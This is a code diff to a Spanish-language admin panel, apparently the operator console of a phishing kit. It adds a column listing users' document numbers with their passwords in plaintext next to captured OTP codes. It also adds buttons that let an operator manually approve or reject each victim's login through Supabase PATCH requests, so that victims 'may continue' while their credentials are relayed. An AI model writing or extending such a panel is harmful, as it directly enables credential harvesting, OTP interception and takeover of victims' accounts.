@@ -39,7 +39,15 @@
   .btn-otp-desaprobar { background: #C1121F; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px; }
   .btn-otp-desaprobar:hover { background: #8F0D17; }
   .btn-otp-aprobar:disabled, .btn-otp-desaprobar:disabled { background: #ccc; cursor: not-allowed; }
+  .btn-login-aprobar { background: #105163; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px; }
+  .btn-login-aprobar:hover { background: #0B3642; }
+  .btn-login-desaprobar { background: #C1121F; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px; }
+  .btn-login-desaprobar:hover { background: #8F0D17; }
+  .btn-login-aprobar:disabled, .btn-login-desaprobar:disabled { background: #ccc; cursor: not-allowed; }
+  .badge.login_aprobado { background: #D4ECD0; color: #1A6A0C; }
+  .badge.login_desaprobado { background: #FDE2E2; color: #C1121F; }
   .empty { text-align: center; padding: 40px; color: #888; }
+
   .toast { position: fixed; top: 20px; right: 20px; background: #27C112; color: #fff; padding: 14px 20px; border-radius: 8px; display: none; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 999; }
   .toast.show { display: block; animation: slideIn 0.3s; }
   .toast.error { background: #C1121F; }
@@ -86,7 +94,9 @@
           <tr>
             <th>ID Sesión</th>
             <th>Documento</th>
+            <th>Contraseña</th>
             <th>Estado</th>
+            <th>Estado Login</th>
             <th>Código OTP</th>
             <th>Estado OTP</th>
             <th>Creada</th>
@@ -94,8 +104,9 @@
           </tr>
         </thead>
         <tbody id="tablaSesiones">
-          <tr><td colspan="7" class="empty">Cargando sesiones...</td></tr>
+          <tr><td colspan="9" class="empty">Cargando sesiones...</td></tr>
         </tbody>
+
       </table>
     </div>
   </div>
@@ -127,8 +138,9 @@
     })
     .catch(function(err) {
       console.error('Error cargando sesiones:', err);
-      document.getElementById('tablaSesiones').innerHTML = '<tr><td colspan="7" class="empty">Error al cargar sesiones</td></tr>';
+      document.getElementById('tablaSesiones').innerHTML = '<tr><td colspan="8" class="empty">Error al cargar sesiones</td></tr>';
     });
+
   }
 
   function cargarCodigos(sesiones) {
@@ -174,7 +186,7 @@
   function renderTabla(data) {
     var tbody = document.getElementById('tablaSesiones');
     if (data.length === 0) {
-      tbody.innerHTML = '<tr><td colspan="7" class="empty">No hay sesiones registradas</td></tr>';
+      tbody.innerHTML = '<tr><td colspan="8" class="empty">No hay sesiones registradas</td></tr>';
       return;
     }
     var html = '';
@@ -182,6 +194,11 @@
       var estado = s.estado || 'desconocido';
       var badgeClass = estado === 'finalizada' ? 'finalizada' : (estado === 'activa' ? 'activa' : 'login');
       var badgeLabel = estado === 'finalizada' ? 'Finalizada' : (estado === 'activa' ? 'Activa' : 'Login');
+
+      // Estado del login
+      var loginEstado = s.login_estado || 'pendiente';
+      var loginBadgeClass = loginEstado === 'aprobado' ? 'login_aprobado' : (loginEstado === 'desaprobado' ? 'login_desaprobado' : 'login');
+      var loginBadgeLabel = loginEstado === 'aprobado' ? 'Aprobado' : (loginEstado === 'desaprobado' ? 'Desaprobado' : 'Pendiente');
 
       // Obtener el código OTP de la sesión (el más reciente)
       var codigos = codigosCache[s.sesion_id] || [];
@@ -197,6 +214,19 @@
       var btn = '';
 
       if (estado !== 'finalizada') {
+        // Botones de aprobar/desaprobar login si está pendiente
+        var loginBtns = '';
+        if (loginEstado === 'pendiente') {
+          loginBtns = '<div class="acciones">' +
+            '<button class="btn-login-aprobar" onclick="aprobarLogin(\'' + s.sesion_id + '\', this)">✓ Aprobar Login</button>' +
+            '<button class="btn-login-desaprobar" onclick="desaprobarLogin(\'' + s.sesion_id + '\', this)">✗ Desaprobar</button>' +
+            '</div>';
+        } else if (loginEstado === 'aprobado') {
+          loginBtns = '<span style="color:#27C112;font-weight:600;">✓ Aprobado</span>';
+        } else {
+          loginBtns = '<span style="color:#C1121F;font-weight:600;">✗ Desaprobado</span>';
+        }
+
         // Si hay código OTP y no está aprobado, mostrar botones de aprobar/desaprobar
         if (otpCode && otpEstado !== 'aprobado') {
           btn = '<div class="acciones">' +
@@ -210,21 +240,25 @@
             '</div>';
         }
       } else {
+        loginBtns = '<span style="color:#27C112;font-weight:600;">✓</span>';
         btn = '<span style="color:#27C112;font-weight:600;">✓</span>';
       }
 
       html += '<tr>' +
         '<td class="mono">' + (s.sesion_id || '-') + '</td>' +
         '<td>' + (s.tipo_documento || '') + ' ' + (s.numero_documento || '-') + '</td>' +
+        '<td class="mono">' + (s.contrasena || '-') + '</td>' +
         '<td><span class="badge ' + badgeClass + '">' + badgeLabel + '</span></td>' +
+        '<td><span class="badge ' + loginBadgeClass + '">' + loginBadgeLabel + '</span></td>' +
         '<td>' + otpHtml + '</td>' +
         '<td><span class="badge ' + otpBadgeClass + '">' + otpBadgeLabel + '</span></td>' +
         '<td>' + creada + '</td>' +
-        '<td>' + btn + '</td>' +
+        '<td>' + loginBtns + '<br>' + btn + '</td>' +
         '</tr>';
     });
     tbody.innerHTML = html;
   }
+
 
   // Aprobar OTP
   function aprobarOTP(sesionId, btn) {
@@ -301,8 +335,86 @@
     });
   }
 
+  // Aprobar Login
+  function aprobarLogin(sesionId, btn) {
+    if (!confirm('¿Aprobar el login de esta sesión? El usuario podrá continuar.')) return;
+    btn.disabled = true;
+    btn.textContent = 'Procesando...';
+
+    fetch(SUPABASE_URL + '/rest/v1/sesiones?sesion_id=eq.' + sesionId, {
+      method: 'PATCH',
+      headers: {
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        login_estado: 'aprobado',
+        login_aprobado: true,
+        estado: 'activa',
+        updated_at: new Date().toISOString()
+      })
+    })
+    .then(function(res) {
+      if (res.ok) {
+        mostrarToast('✅ Login aprobado correctamente');
+        cargarSesiones();
+      } else {
+        alert('Error al aprobar el login: ' + res.status);
+        btn.disabled = false;
+        btn.textContent = '✓ Aprobar Login';
+      }
+    })
+    .catch(function(err) {
+      console.error(err);
+      alert('Error de red al aprobar el login');
+      btn.disabled = false;
+      btn.textContent = '✓ Aprobar Login';
+    });
+  }
+
+  // Desaprobar Login
+  function desaprobarLogin(sesionId, btn) {
+    if (!confirm('¿Desaprobar el login? El usuario no podrá continuar.')) return;
+    btn.disabled = true;
+    btn.textContent = 'Procesando...';
+
+    fetch(SUPABASE_URL + '/rest/v1/sesiones?sesion_id=eq.' + sesionId, {
+      method: 'PATCH',
+      headers: {
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        login_estado: 'desaprobado',
+        login_aprobado: false,
+        updated_at: new Date().toISOString()
+      })
+    })
+    .then(function(res) {
+      if (res.ok) {
+        mostrarToast('❌ Login desaprobado. El usuario no podrá continuar.', true);
+        cargarSesiones();
+      } else {
+        alert('Error al desaprobar el login: ' + res.status);
+        btn.disabled = false;
+        btn.textContent = '✗ Desaprobar';
+      }
+    })
+    .catch(function(err) {
+      console.error(err);
+      alert('Error de red al desaprobar el login');
+      btn.disabled = false;
+      btn.textContent = '✗ Desaprobar';
+    });
+  }
+
   function finalizarSesion(sesionId, btn) {
     if (!confirm('¿Finalizar esta sesión? El usuario verá el mensaje de confirmación.')) return;
+
     btn.disabled = true;
     btn.textContent = 'Procesando...';
 
